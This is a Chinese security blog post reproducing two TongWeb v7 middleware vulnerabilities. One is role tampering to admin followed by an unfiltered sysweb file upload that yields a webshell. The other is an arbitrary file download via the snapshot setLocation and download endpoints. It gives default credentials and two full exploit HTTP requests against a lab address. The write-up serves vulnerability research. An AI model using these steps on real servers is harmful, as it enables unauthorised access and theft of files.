#  tongweb闭源中间件代码审计  
原创 大白  蚁景网络安全   2025-06-20 09:32  
  
   
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5znJiaZxqldyq3SBEPw0n6hCXNk6PmR3gyPFJDUCibH91GiaAHHKiaCpcsfnQJ2oImQunzubgDtpxzxNHONU88CypA/640?wx_fmt=gif&from=appmsg "")  
  
应用服务器 TongWeb v7 全面支持 JavaEE7 及 JavaEE8  
  
规范，作为基础架构软件，位于操作系统与应用之间，帮助企业将业务应用集成在一个基础平台上，为应用高效、稳定、安全运行提供关键支撑，包括便捷的开发、随需应变的灵活部署、丰富的运行时监视、高效的管理等。  
  
本文对该中间件部分公开在互联网，但未分析细节的漏洞进行复现分析：  
  
**sysweb后台上传getshell：**  
  
在互联网搜索发现该版本存在sysweb后台文件下载，可惜却没有复现细节，且访问显示如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gZztZlPGbJX8NWcCa2awnHVSBCGBETkLeQQRvQCu5icvFe6IpMqYUB8A/640?wx_fmt=png&from=appmsg "null")  
  
发现通过默认口令thanos/thanos123.com无法登录，且未发现任何相关的默认口令：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gA8dqPWEKzw2oSzic20gQwnz5W3SjLjCMuZnnnribSf8AdV6seF5DOtSw/640?wx_fmt=png&from=appmsg "null")  
  
于是自己找到配置文件查看权限校验情况：  
  
\sysweb\WEB-INF\web.xml：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408giaX2wxFztwtdVC9Kic2RkLfiaDQ150AbqN1IRjOLgj4ka8lsd8vuD40FQ/640?wx_fmt=png&from=appmsg "null")  
  
发现配置情况如上，一切/*请求均需要admin权限才行，但目前互联网暂未发现任何其他相关权限账号，自己尝试admin相关弱口令也均为成功，于是继续寻找用户相关功能点：  
  
点击安全服务--安全域管理：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gOsM54iaB7PJskvbibAZfYhfwdPXXoD3yTRncQLAAqSpUkR6JBgcFMe4Q/640?wx_fmt=png&from=appmsg "null")  
  
点击该安全域：找到默认账户的thanos用户：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408g7fYQhBaPYyBH9nJeoYlxR8cobZve5scr37bYK7Wsot6mnPWAqqvFdw/640?wx_fmt=png&from=appmsg "null")  
  
点击保存，查看数据包：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gibKaUATnkic9A6rdnlSxajHawsBV4DAM88qIZLqojwCm2HSGnscfpWSQ/640?wx_fmt=png&from=appmsg "null")  
  
发现该账户的userRole为tongweb与sysweb要求的admin并不匹配，于是点击创建用户：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gkiaqibNDENG6PicfUbt983ftc1UpR83fBDaCmwulIzmtLSqYd5Wgb5P4w/640?wx_fmt=png&from=appmsg "null")  
  
但并未发现可以随意设置用户的useRole，于是点击保存，并拦截数据包：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gSTYDDcze52RTmazKUQ3F0lPvEjA1joaDdd6qibg3icjO1boMibVibJDdfA/640?wx_fmt=png&from=appmsg "null")  
  
将空白的userRole设置为admin，并放包：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gVogqELCye4BcQeEeqx4Ht8xWQ5P8X0hJMDvKvrxib1I9LKcWTbpSr6w/640?wx_fmt=png&from=appmsg "null")  
  
发现创建成功。于是尝试sysweb登录：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gtIQx37RKM9qSY385KecggEXXSSdnkNMZ1IiclMsYowu3oGYfKRpoIzg/640?wx_fmt=png&from=appmsg "null")  
  
发现仅仅是如上页面，但是至少权限问题解决了。  
  
接着返回sysweb的配置文件:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gyUS3NBJnfFGE8sv6ayibKBRWKXP7d3tZOZTfxUAr4jfTtfvJm3zG0PQ/640?wx_fmt=png&from=appmsg "null")  
  
跟进分析：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gR9QG6zickLFDP8ZVXV10ooRb4dHho8POiaB9KZrJGKlee0aKUmrrcAeA/640?wx_fmt=png&from=appmsg "null")  
  
发现未进行任何校验过滤，直接通过parseFileName()方法解析header获取文件名赋值给fileName。  
  
构造如下文件上传数据包：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gA5EY4r2jQIII2qS0CeGXPZJPd28rALwN3MYjUuudYzpjOzcHOsdN6Q/640?wx_fmt=png&from=appmsg "null")  
  
上传成功，shell加一：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gr93LNMff7xpsib5vdVQ4EpcKsNicFXb0pqSD6wUMOYaicNI9ZakzulkjA/640?wx_fmt=png&from=appmsg "null")  
  
**任意文件下载漏洞：**  
  
默认账号密码:thanos/thanos123.com登录后台，在快照管理处存在下载功能点：  
  
![屏幕截图 2025-06-15
105505](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gPhY1Gyd1XbbadCWqTkzUgoTrav6Y8bsgGXQ51JEsF97czELxnhw3Vw/640?wx_fmt=png&from=appmsg "null")  
  
点击下载抓包查看：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gMghsOnujvFZmFG19Z0V0UWuIISB2n9WF5npo8ETll3InczMr7xAGtg/640?wx_fmt=png&from=appmsg "null")  
  
下载文件打包成压缩包下载：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gjX6icKUZyEVpPZaEIZVMriaPHbjKAU5qXicvgcicsUFflT0CGskE6tCEUw/640?wx_fmt=png&from=appmsg "null")  
  
如上，疑似存在下载漏洞，跟进路由：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408giaAQttpM2xSpMR61icf0Lf7naQk6xKZmQkqs432bEQedXibZIshYSux2Q/640?wx_fmt=png&from=appmsg "null")  
  
如上，先找到类级别的路径位置，注解表示由/rest/monitor/snapshots根路径发起的请求均会被该类处理。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gEnibcCPCdibPctwTberLjqXY3QBU6T5AbT5t6VAF1ibIP1xzCqLcW8fJg/640?wx_fmt=png&from=appmsg "null")  
  
  
  随后再找到方法级别的路由位置，download的post请求均会被该方法处理：  
  
可见该方法接收了前面数据包传输的参数filename，并赋值给snapshotname参数。  
  
分析如上代码存在以下路径：  
  
Path：根路径，由system.getProperty/temp/download组成  
  
snapshotRootPath：由path/snapshotname组成。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gCNxqojU3SksZ8ticwVib8y6c5CsiaFtkSBLJVcfP84n7lXrAGaQ0tdWmg/640?wx_fmt=png&from=appmsg "null")  
  
随后进入AgentUtil.receiveFileOrDir()进行目标文件压缩，下载，且此处未进行任何校验：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gsOCL9KqauXMg9hiaISwtgYNX8TuPW0STP8ypCibKOoQbnvjd04yiaWtgg/640?wx_fmt=png&from=appmsg "null")  
  
但如果直接修改数据包filename进行任意文件下载依然会失败，因为紧接着代码进行了如下校验：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gI92uhZEOZy8AaVDenFoNGDEq0Iibf0CYp4p5J8cq5p2d7HOl2JGE3pw/640?wx_fmt=png&from=appmsg "null")  
  
判断下载路径snapshotRootPath的父路径是否是path，也就是对snapshotname与path拼接后的路径进行校验，如果snapshotname值为../../或者为/a/b这种格式则无法通过校验，也就是限制了跨目录操作。  
  
但回过头来查看具体下载操作：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gflm6CorYNpZ6bWKj18jziawSNibxpdlOQGegaHic3aiaWXqqeQtxX0z16Q/640?wx_fmt=png&from=appmsg "null")  
  
是通过fileOrDir路径与snapshotRootPath进行文件下载的，查找location的值：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gOficw5fJDGU5OiaBk6WUvVYibiaBflgt8gKv2ibbw9DiarouZXTWzu9OJNtg/640?wx_fmt=png&from=appmsg "null")  
  
且发现location参数值可控：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408g9LaXTUBiaT87fvoicHqRCVOrZwOL5aw9ESYRBZr2ibbEwxR1CZTjLk8ibw/640?wx_fmt=png&from=appmsg "null")  
  
于是先通过如下数据包修改location的值(修改为想任意下载的目录)：  
```
POST /console/rest/monitor/snapshots/setLocation HTTP/1.1Host: 192.168.73.130:9060User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0)Gecko/20100101 Firefox/138.0Accept: application/json, text/javascript, \*/\*; q=0.01Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 36Origin: http://192.168.73.130:9060Connection: keep-aliveReferer: http://192.168.73.130:9060/console/restCookie: console-c-4aff-9=EABC776A7845EFBDA555BAA1D078F628;DWRSESSIONID=858h23g\$aEjH1iqRz1jnGBLe3rpsnapshot_location=D%3A%5CTongWeb7.42
```  
  
随后再进行下载：  
```
POST /console/rest/monitor/snapshots/download HTTP/1.1Host: 192.168.73.130:9060User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0)Gecko/20100101 Firefox/139.0Accept:text/html,application/xhtml+xml,application/xml;q=0.9,\*/\*;q=0.8Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brContent-Type: application/x-www-form-urlencodedContent-Length: 39Origin: http://192.168.73.130:9060Connection: keep-aliveReferer: http://192.168.73.130:9060/console/pages/monitor/snapshot.jspCookie: console-c-4aff-9=429BD65834FAD60D489BC2F36DAF93C5;DWRSESSIONID=jvSHNTT66zO2\$Hjyb4sFS7vYdrpUpgrade-Insecure-Requests: 1Priority: u=4filename=conf
```  
  
如下，下载成功：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxXhNbSGF5jiamW6oZdo408gkianqUuFkCEkrf9NJTtLBK2qSqUmgCe1h8e6DuaCb8HoPrIrqtmZXSA/640?wx_fmt=png&from=appmsg "null")  
  
  
[](https://mp.weixin.qq.com/s?__biz=MzkxNTIwNTkyNg==&mid=2247549615&idx=1&sn=5de0fec4a85adc4c45c6864eec2c5c56&scene=21#wechat_redirect)  
  
  
